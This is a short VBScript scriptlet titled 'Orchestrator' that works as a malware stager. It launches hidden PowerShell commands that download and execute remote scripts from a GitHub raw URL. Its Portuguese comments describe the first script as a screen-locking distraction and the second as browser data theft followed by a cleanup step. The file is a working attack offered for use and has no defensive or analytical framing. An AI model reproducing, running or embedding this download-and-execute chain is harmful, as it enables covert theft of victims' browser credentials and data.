<?XML version="1.0"?>
<scriptlet>
<registration progid="Orchestrator" classid="{A111B222-C333-D444-E555-F666G777H888}">
    <script language="VBScript">
        Sub Execute()
            Dim shell, baseUrl, psCommand

            Set shell = CreateObject("WScript.Shell")
            baseUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/"

            ' 1. DISTRAÇÃO – executa ANDRE.ps1 (trava tela)
            psCommand = "powershell -NoP -W Hidden -C ""iex (iwr -Uri '" & baseUrl & "ANDRE.ps1' -UseBasicParsing).Content"""
            shell.Run psCommand, 0, False

            ' Aguarda 3 segundos para a distração iniciar
            WScript.Sleep 3000

            ' 2. ROUBO DE DADOS – executa BROWSER-ALL.ps1 (que já chama o CLEANER no final)
            psCommand = "powershell -NoP -W Hidden -C ""iex (iwr -Uri '" & baseUrl & "BROWSER-ALL.ps1' -UseBasicParsing).Content"""
            shell.Run psCommand, 0, False

            ' O orquestrador pode ser fechado aqui; o resto é tratado pelos scripts
        End Sub
    </script>
</registration>
</scriptlet>
